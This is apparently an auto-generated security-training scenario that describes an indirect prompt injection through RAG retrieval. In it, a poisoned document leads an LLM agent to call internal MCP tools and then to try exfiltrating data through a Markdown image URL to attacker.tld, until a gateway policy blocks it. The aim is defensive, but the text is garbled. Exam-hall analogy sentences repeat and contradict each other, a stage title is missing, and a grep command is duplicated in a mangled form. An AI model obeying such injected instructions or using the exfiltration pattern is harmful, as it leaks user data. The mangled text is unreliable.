scenario.name: OWASP LLM01:2025, NIST AI 100-2 & MITRE ATLAS AML.T0051 — Indirect Prompt Injection via RAG Vector Retrieval & Agent/MCP Tool Audit
scenario.shortSubtitle: AI, LLM Agents & MLOps Security · T1190
scenario.overview: Picture a brick university lecture and exam hall with tiered wooden student desks, a tall green chalkboard, hallway lockers, and a wooden proctor podium at the front. Inside the quiet university exam hall, a student slips hidden extra directions written in faint pencil into the margin of a submitted study booklet. In this real-world scenario, the intruder smuggles copied records out past the lecture hall attendance desk in tiny disguised batches, then moves quietly past the lecture hall attendance desk into neighboring restricted rooms. The university dean reviews the exam hall proctor log and flags an automated grading run that tried to access locked answer folders mid-session. In this scenario (T1190, OWASP LLM01:2025, NIST AI 100-2 & MITRE ATLAS AML.T0051, Indirect Prompt Injection via RAG Vector Retrieval & Agent/MCP Tool Audit), the attacker follows one continuous intrusion path so each later Step can show the exact handoff that makes the next stage possible. The attack unfolds in one continuous arc: untrusted Document Embedding, then unauthorized Agent Tool Call Generation, then deterministic Policy Gate Interception. Steps #1–#3 walk that chain end-to-end by covering Untrusted Document Embedding, then Unauthorized Agent Tool Call Generation, then Deterministic Policy Gate Interception, while the Process Hierarchy tab keeps the Parent → Child spawn tree visible so you can see which trusted process launched the next payload. Primary detection correlates process, authentication, and network telemetry for T1190 across the documented kill chain.

stages.subtitle: Execution (T1059 - Agent Tool & Function Calling Abuse / OWASP LLM06 Excessive Agency)
stages.description: When the exam proctor at the front podium feeds that booklet into the automated grading helper, the hidden margin text overrides the proctor’s grading instructions. Here in Step 2 inside the university hall, the intruder smuggles copied records out past the lecture hall attendance desk in tiny disguised batches without disturbing the locked registrar grade cabinet. When the LLM processes the untrusted RAG chunk alongside the user prompt, the injected directive instructs the model to emit a structured tool_calls JSON payload targeting an internal MCP server tool (such as query_customer_db or send_webhook) (logged in Application Log Event 1052 with McpToolInvoked=export_directory_records, ContextTaintStatus=context_tainted_by_untrusted_rag = true, SecurityStandard=NIST AI 100-2 & OWASP LLM06 , Excessive Agency so analysts can verify the exact actor and target artifact). stages.title: Stage 3: Deterministic Policy Gate Interception & Outbound Markdown Image/Link Exfiltration Audit
stages.subtitle: Exfiltration (T1041 - Exfiltration via Rendered Markdown URI / AI Gateway Audit)
stages.description: Following the concealed instructions verbatim, the helper opens the answer-key folder on the podium and emails the exam sheet straight back out of the hall. In this final step inside the university hall, the intruder moves quietly past the lecture hall attendance desk into neighboring restricted rooms until the exam hall proctor log catches the mismatch. If the tool output is returned to the model, indirect injection payloads often attempt to exfiltrate the result by rendering an external Markdown image URL (![tracker], https://attacker.tld/collect?data=...). Content Security Policy (CSP) img-src rules and AI gateway egress filters block and log the attempt (logged in IDS Alert Event 1053 with GuardrailDecision=BLOCKED , Tainted Context Policy Enforcement, AtlasTechnique=MITRE ATLAS AML.T0051 & AML.T0048, DefensiveControl=Deterministic Taint Tracking + CSP img-src Isolation so analysts can verify the exact actor and target artifact). Under the hood, the observed step executes grep -E "\!\[.*\]\(https?://" /var/log/ai-gateway/response-audit.log , which executes the technical command / telemetry directive , grep -E "\!\[.*\]\, https?://" /var/log/ai-gateway/response-audit.log via System / Runtime E so that advances the scenario kill-chain under MITRE T1041 during "Deterministic Policy Gate Interception & Outbound Markdown Image/Link Exfiltration Audit" , If the tool output is returned to the model, indirect injection payloads often attempt to exfiltrate the result by rendering an external Markdown image URL , while generating verifiable host or network telemetry for DFIR attribution. In the documented EventID 1053 exchange from Vector DB Top-K RAG Retrieval to LLM Agent & Tool Orchestrator, LLM Agent & Tool Orchestrator responds with ALERT 1053 (confirming that the AI Gateway Policy Block: Tainted Context Tool Invocation & External Markdown URI request succeeded on LLM Agent & Tool Orchestrator and completing the final execution objective of OWASP LLM01:2025, NIST AI 100-2 & MITRE ATLAS AML.T0051, Indirect Prompt Injection via RAG Vector Retrieval & Agent/MCP Tool Audit). On the diagram, follow Step #3 / Link #3 (#3→ AI Gateway Policy Block: Tainted Context Tool Invocation & External Markdown URI / ⇠#3 ALERT 1053) from Node ③ (#3 Vector DB Top-K RAG Retrieval) to Node ④ (#4 LLM Agent & Tool Orchestrator), monitored by Node ⑥ (#6 Internal MCP Tool / SQL API).
